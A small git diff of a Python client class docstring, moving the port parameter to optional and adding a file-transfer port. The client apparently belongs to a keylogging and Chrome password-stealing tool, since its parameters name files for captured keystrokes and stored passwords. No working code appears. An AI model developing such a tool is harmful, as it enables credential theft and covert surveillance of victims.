@@ -23,9 +23,10 @@ class Client:
 
         required:
         :param host: The server's IP
-        :param port: The server's port number
         
         optional:
+        :param port: The server's port number
+        :param file_port: The port number used for the file transfer
         :param keylog_filename: The file's name where the keystrokes are stored
         :param chromepass_filename: The file name where the chrome passwords are stored
         """
